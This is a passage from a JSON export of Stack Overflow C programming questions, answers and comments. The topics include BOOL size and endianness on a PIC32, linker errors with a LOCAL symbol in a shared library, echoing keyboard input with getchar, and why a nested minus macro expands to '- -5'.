write <code>int long unsigned const long static u = 23;</code>, you shouldn&#39;t do that.  Interestingly, GCC 7.1.0 when run with <code>-Werror -Wold-style-declaration</code> doesn&#39;t allow it: <code>error: \u2018static\u2019 is not at beginning of declaration [-Werror=old-style-declaration]</code>.  (And <code>-Wextra</code> includes <code>-Wold-style-declaration</code> (at least in GCC 7.1.0), so you don&#39;t have to add it separately.)"}, {"owner": {"reputation": 1669, "user_id": 7508077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b4193888717f50e77805498af1435b9?s=128&d=identicon&r=PG&f=1", "display_name": "EsmaeelE", "link": "https://stackoverflow.com/users/7508077/esmaeele"}, "edited": false, "score": 0, "creation_date": 1499293357, "post_id": 44936498, "comment_id": 76850134, "body": "Endianess is way of Read/Write data with processor. A LE processor like x86 architecture data stored in Memory by CPU in reverse order. unsigned int a = 0x1234; store in 3412 order. (unsigned int : 16 bit). LE reverse byte order when storing on Memory (RAM)"}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 4, "last_activity_date": 1499292539, "creation_date": 1499292539, "answer_id": 44936782, "question_id": 44936498, "link": "https://stackoverflow.com/questions/44936498/endianess-related-to-processor-or-data-type/44936782#44936782", "title": "Endianess Related to processor or data type", "body": "<p><code>BOOL</code> is not a standard type. Depending on how it is defined in your environment, probably via a <code>typedef</code> in a header file, it may be any integer type, including <code>unsigned char</code> which would use 1 byte or <code>int</code> which may use 4 bytes on your system and other sizes for other architectures.</p>\n"}], "owner": {"reputation": 409, "user_id": 4657413, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/6u2Hm.jpg?s=128&g=1", "display_name": "newb7777", "link": "https://stackoverflow.com/users/4657413/newb7777"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 44936782, "answer_count": 1, "score": 2, "last_activity_date": 1499292539, "creation_date": 1499291133, "question_id": 44936498, "link": "https://stackoverflow.com/questions/44936498/endianess-related-to-processor-or-data-type", "title": "Endianess Related to processor or data type", "body": "<p>I am working with little endian processor PIC 32 and am looking at a variable that is of type BOOL. One variable is initialized to TRUE and the other as false.</p>\n\n<pre><code>static BOOL A = TRUE;\nBOOL static B = FALSE;\n</code></pre>\n\n<p>In Memory when I look in memory for variable A, it shows\n<a href=\"https://i.stack.imgur.com/LqWnH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/LqWnH.png\" alt=\"32 bit TRUE\"></a></p>\n\n<p>It looks like the processor just assigns a 32 bit number for true and false and not 8 bits so that means its processor dependent. \nFor an array of 6 elements of type BOOL, all set to TRUE. How would it be read? Is it going to show up as 6 elements of what is shown in the picture above?  </p>\n"}, {"tags": ["c", "eclipse", "content-assist"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1499290367, "post_id": 44936299, "comment_id": 76848917, "body": "Go to <code>Window-&gt;Preferences-&gt;C&#47;C++-&gt;Editor-&gt;Content Assist-&gt;Templates</code> and check there."}, {"owner": {"reputation": 89, "user_id": 4695857, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206221820370123/picture?type=large", "display_name": "Jeppe Clausen", "link": "https://stackoverflow.com/users/4695857/jeppe-clausen"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499323133, "post_id": 44936299, "comment_id": 76858612, "body": "To answer my own question. The solution were to just roll back to CCS 6.1.3.  In the version 6 the default behaviour is as expected."}], "owner": {"reputation": 89, "user_id": 4695857, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206221820370123/picture?type=large", "display_name": "Jeppe Clausen", "link": "https://stackoverflow.com/users/4695857/jeppe-clausen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 111, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1509352735, "creation_date": 1499290110, "last_edit_date": 1509352735, "question_id": 44936299, "link": "https://stackoverflow.com/questions/44936299/code-composer-studio-content-assist", "title": "Code composer studio Content assist", "body": "<p>I have a problem with the content assist of code composer studio v.7.2. The problem is that it fills out methods with its prototyped method/function arguments. </p>\n\n<pre><code>foo(int someint,double somedouble){...}\n</code></pre>\n\n<p>when i then in code composer start writing foo and press Ctrl + Space and then select the suggested completion it will complete to this:</p>\n\n<pre><code>foo(int someint,double somedouble){Cursor position is here?}\n</code></pre>\n\n<p>this is really annoying hope you guys can help.</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1499289704, "post_id": 44936117, "comment_id": 76848597, "body": "Why is this tagged C++?"}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "edited": false, "score": 3, "creation_date": 1499290199, "post_id": 44936117, "comment_id": 76848844, "body": "Behavior is as expected, as the symbol is <code>LOCAL</code> so it is local to the shared library and not accessable to other objects.  If you want to call it from your program, you&#39;ll need to modify the library to export it (make it <code>GLOBAL</code>)"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1499292485, "post_id": 44936117, "comment_id": 76849812, "body": "Since the function is local, it&#39;s not intended to be called by client code. You should check the library documentation to see how you&#39;re supposed to use it."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1499292520, "post_id": 44936117, "comment_id": 76849821, "body": "This is essentially like trying to call a private method from outside the class in C++."}, {"owner": {"reputation": 31, "user_id": 992325, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460398adf686ea1882ef13852997e243?s=128&d=identicon&r=PG", "display_name": "Utkarsh Gaur", "link": "https://stackoverflow.com/users/992325/utkarsh-gaur"}, "reply_to_user": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "edited": false, "score": 0, "creation_date": 1499296939, "post_id": 44936117, "comment_id": 76851306, "body": "@Chris Dodd, @ Barmar -- that makes sense, the library authors asked me to use that function but they forgot to make it global it seems. The code works for VS/Windows .lib but now my guess is they did infact make it global for the windows libs. Thanks for the insight!"}], "owner": {"reputation": 31, "user_id": 992325, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/460398adf686ea1882ef13852997e243?s=128&d=identicon&r=PG", "display_name": "Utkarsh Gaur", "link": "https://stackoverflow.com/users/992325/utkarsh-gaur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 359, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1499289784, "creation_date": 1499289333, "last_edit_date": 1499289784, "question_id": 44936117, "link": "https://stackoverflow.com/questions/44936117/gcc-c-undefined-reference-to-function-error-trying-to-compile-link-with-a-so", "title": "GCC C &quot;undefined reference to function&quot; error trying to compile/link with a .so library file", "body": "<p>I am trying to use a 3rd party library (.so) file in my project. A very simple program to do that:</p>\n\n<pre><code>#include \"LibGent.h\"\n#include \"genttypes.h\"\n\nint main() {\n        GT_LIB* gtLib = LibGentGet();\n        return 0;\n}\n</code></pre>\n\n<p>I compile/link the program above against libgent.so:</p>\n\n<pre><code>gcc testing.c -L/home/username/proj -lgent\n</code></pre>\n\n<p>I get the following error:</p>\n\n<pre><code>/tmp/ccALOJwU.o: In function `main': testing.c:(.text+0x11): undefined reference to `LibGentGet'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n\n<p>However, I can see that the function <code>LibGentGet</code> is defined in the .so file:</p>\n\n<pre><code>readelf -Ws libgent.so | grep \"LibGentGet\"\n301: 0000000000044820     8 FUNC    LOCAL  DEFAULT    8 LibGentGet\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["c", "loops", "while-loop", "keyboard"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499287991, "post_id": 44935781, "comment_id": 76847802, "body": "<code>char</code> is a single character. You want to have an array of a sufficient length, and the corresponding format specifier <code>%s</code>."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 5, "creation_date": 1499287994, "post_id": 44935781, "comment_id": 76847805, "body": "Did you read any C book, C tutorial or do any basic research by hitting your favourite search engine?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1499288112, "post_id": 44935781, "comment_id": 76847860, "body": "<code>int ch; while((ch = getchar()) != EOF &amp;&amp; ch != &#39;\\n&#39;) putchar(ch);</code> ?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499288244, "post_id": 44935781, "comment_id": 76847929, "body": "@BLUEPIXY This won&#39;t look nicely with keyboard input.."}], "answers": [{"comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499289463, "post_id": 44935979, "comment_id": 76848487, "body": "1st version is <i>undefined behavior</i>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499289870, "post_id": 44935979, "comment_id": 76848684, "body": "<code>int character; while (character != EOF &amp;&amp; character != &#39;\\n&#39;)</code> uses <code>character</code> before it is initialized/assigned."}], "tags": [], "owner": {"reputation": 64, "user_id": 5281191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39b130dc67d5ca82fff5714ae8e42cf8?s=128&d=identicon&r=PG&f=1", "display_name": "Minnow", "link": "https://stackoverflow.com/users/5281191/minnow"}, "is_accepted": false, "score": 0, "last_activity_date": 1499288751, "creation_date": 1499288751, "answer_id": 44935979, "question_id": 44935781, "link": "https://stackoverflow.com/questions/44935781/string-variable-and-echo-c-homework/44935979#44935979", "title": "String variable and echo (C) *Homework*", "body": "<p>You could try using <code>getchar</code> which returns a single character from stdin.</p>\n\n<pre><code>int character;\nwhile (character != EOF &amp;&amp; character != '\\n') {\n    character = getchar();\n    putchar(character);\n}\n</code></pre>\n\n<p>Alternatively, you can make an assignment inside the while loop.</p>\n\n<pre><code>int character;\nwhile ((character = getchar()) != EOF &amp;&amp; character != '\\n')\n    putchar(character);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499289021, "post_id": 44936014, "comment_id": 76848285, "body": "Depending on <code>stdin&#47;stdout</code> buffering, might this intermix the typed data with output data?"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1499289124, "post_id": 44936014, "comment_id": 76848330, "body": "@chux In the assignment there is noting said about this.:)"}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 1, "last_activity_date": 1499288914, "creation_date": 1499288914, "answer_id": 44936014, "question_id": 44935781, "link": "https://stackoverflow.com/questions/44935781/string-variable-and-echo-c-homework/44936014#44936014", "title": "String variable and echo (C) *Homework*", "body": "<p>It seems that all you need is the following</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) \n{\n    printf( \"Please enter anything you want: \" );\n\n    int c;\n\n    while ( ( c = getchar() ) != EOF &amp;&amp; c != '\\n' )\n    {\n        putchar( c );\n    }\n\n    putchar( '\\n' );\n\n    return 0;\n}\n</code></pre>\n\n<p>That is you need to use a loop that will iterate until the Enter key is pressed.</p>\n"}], "owner": {"reputation": 11, "user_id": 8254457, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/20b006c51f5b74c8b0f4c662f012b3b8?s=128&d=identicon&r=PG&f=1", "display_name": "Fera Kahdemi", "link": "https://stackoverflow.com/users/8254457/fera-kahdemi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 223, "favorite_count": 0, "accepted_answer_id": 44936014, "answer_count": 2, "score": -1, "last_activity_date": 1499289203, "creation_date": 1499287904, "last_edit_date": 1499289203, "question_id": 44935781, "link": "https://stackoverflow.com/questions/44935781/string-variable-and-echo-c-homework", "title": "String variable and echo (C) *Homework*", "body": "<p>I am trying to solve this question: Write a C program that reads in characters from the keyboard until the return key is entered and echoes the entered text on the screen. </p>\n\n<p>This is what I have so far, I am not sure what variable I can store the users input in so that I can print it back (assuming that is what they mean by echo):</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string&gt;\nint main ()\n{\n    char sentence;\n    printf(\"Please enter anything you want: \");\n    scanf(\"%c\",&amp;sentence);\n\n    printf(\"%c\",sentence);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "c-preprocessor"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1499283328, "post_id": 44934586, "comment_id": 76845174, "body": "try it out. I&#39;d say 5"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499283402, "post_id": 44934586, "comment_id": 76845225, "body": "What did you get when you tried it?  Why didn&#39;t you try it?  What is puzzling you about the output?"}, {"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 0, "creation_date": 1499283420, "post_id": 44934586, "comment_id": 76845233, "body": "Hmm... it compiles with clang on macOS and the output says <code>5</code>."}, {"owner": {"reputation": 165, "user_id": 6644397, "user_type": "registered", "profile_image": "https://graph.facebook.com/339836286349003/picture?type=large", "display_name": "Anwar Hussain", "link": "https://stackoverflow.com/users/6644397/anwar-hussain"}, "edited": false, "score": 0, "creation_date": 1499283450, "post_id": 44934586, "comment_id": 76845255, "body": "why the output is 5?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 5, "creation_date": 1499283454, "post_id": 44934586, "comment_id": 76845257, "body": "Remember, the input is already tokenized before the preprocessor processes macro expansion.  Therefore, the code is as if you&#39;d written <code>- - 5</code> rather than <code>--5</code> which would be an error (you can&#39;t decrement a constant)."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499283579, "post_id": 44934586, "comment_id": 76845304, "body": "@EOF it&#39;s perfectly legal. The illegal thing is to try to force the preprocessor to perform 2 passes by trying to <code>#define</code> macro which performs a <code>#define</code>. Not the case here"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499284013, "post_id": 44934586, "comment_id": 76845573, "body": "@Marged lazy but interesting enough :)"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499284043, "post_id": 44934586, "comment_id": 76845597, "body": "@Marged: I don&#39;t agree: it has nothing to do with lazyness, compiling source code does not prove much, explaining where the extra space comes from is the core of the trick question. Telling the interviewer about token pasting and compiler bugs would be a fantastic answer from an applicant."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499284182, "post_id": 44934586, "comment_id": 76845690, "body": "methinks that this is a great question :) as @chqrlie noted, sole compiling doesn&#39;t help much to understand why this works."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499284306, "post_id": 44934586, "comment_id": 76845764, "body": "@JonathanLeffler your 27 comments on that Q&amp;A - gathered - could be great material for an answer, since no answer explained the tokenizing stuff (chqrlie&#39;s answer does, yes). thanks for the edit BTW."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499287933, "post_id": 44934586, "comment_id": 76847767, "body": "The question <a href=\"https://stackoverflow.com/questions/1489932/\">How to concatenate twice with the C preprocessor and expand a macro as in <code>arg ## _ ## MACRO</code></a> has relevant information, but isn&#39;t by any stretch of the imagination a duplicate.  The question <a href=\"https://stackoverflow.com/questions/41710558\">Can we write a macro over many lines without using a backslash at the end?</a> also has relevant information about stages 1-4 of the processing (stage 3 tokenizes; stage 4 preprocesses)."}, {"owner": {"reputation": 811, "user_id": 1273178, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f9c4b75eae227c2f8190e963367a4f9?s=128&d=identicon&r=PG", "display_name": "Rastaban", "link": "https://stackoverflow.com/users/1273178/rastaban"}, "edited": false, "score": 0, "creation_date": 1499797720, "post_id": 44934586, "comment_id": 77058300, "body": "MSVC compiler dev here.  Our current preprocessor is (mostly) string based, and as a side effect it will concatenate in places where it should not.  I am in the process of rewriting the preprocessor to correctly handle pp-tokens.  It is a tricky problem to solve because there is a significant amount of legacy code that relies on this behavior, so I am not sure when the conformant preprocessor will be complete."}], "answers": [{"tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 5, "last_activity_date": 1499284210, "last_edit_date": 1499284210, "creation_date": 1499283437, "answer_id": 44934628, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c/44934628#44934628", "title": "Understanding macros in C", "body": "<p>No need to compile this code, just use <code>gcc -E</code> on it (preprocessor) and see what happens:</p>\n\n<pre><code>&lt;lots of output expanding stdio.h&gt; ...\n\nint main()\n{\n  printf(\"The value of A is %d\\n\", - -5);\n  return 0;\n}\n</code></pre>\n\n<p>Obviously the result is <code>5</code> (which could have been guessed by looking at the nested macros, but a small preprocessor test doesn't hurt).</p>\n\n<p>(Other answers noted that some compilers may handle the preprocessing of the minus signs which would result in a compiler error. <code>gcc</code> handles that nicely.)</p>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 6, "creation_date": 1499283725, "post_id": 44934675, "comment_id": 76845392, "body": "Congratulations.  You can file a bug report with Microsoft.  That is incorrect behaviour by their compiler."}, {"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499283850, "post_id": 44934675, "comment_id": 76845465, "body": "@JonathanLeffler why is this a bug? clang expands <code>B</code> to <code>-5</code> and <code>A</code> to <code>- -5</code>. Where the space come from? And, if clang and gcc are right, why they don&#39;t expand <code>B</code> to <code>- 5</code>?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 0, "creation_date": 1499283988, "post_id": 44934675, "comment_id": 76845556, "body": "@axiac: the space is the char that saves the compilation, by creating a double minus instead of a pre-decrementation."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1499284028, "post_id": 44934675, "comment_id": 76845589, "body": "The input to the preprocessor is tokenized before macros are expanded.  Tokens don&#39;t get untokenized.  The <code>-</code> from <code>-B</code> is one token; it is not subject to further macro expansion.  The next token is <code>B</code>; it is subject to macro expansion as <code>-C</code> (that&#39;s two tokens).  The <code>-</code> is again not subject to macro expansion; it proceeds down the line.  The <code>C</code> is not subject to macro expansion; it passes unscathed.  The output of the preprocessor is 3 tokens \u2014 <code>-</code>, <code>-</code> and <code>C</code>.  Conflating them as <code>--C</code> and then interpreting the two dashes as a decrement is incorrect.  The standard is remarkably clear."}, {"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "reply_to_user": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499284080, "post_id": 44934675, "comment_id": 76845623, "body": "@Jean-Fran&#231;oisFabre I see that. My question is why the preprocessor adds a white space when it expands <code>A</code> but it doesn&#39;t add it when it expands <code>B</code>. It doesn&#39;t seem even to me, as the space is not there in the source code."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 0, "creation_date": 1499284160, "post_id": 44934675, "comment_id": 76845677, "body": "@axiac see Johnathan Leffer excellent comments. The compilers are just complying to the norm (well, some ... :))"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 2, "creation_date": 1499284395, 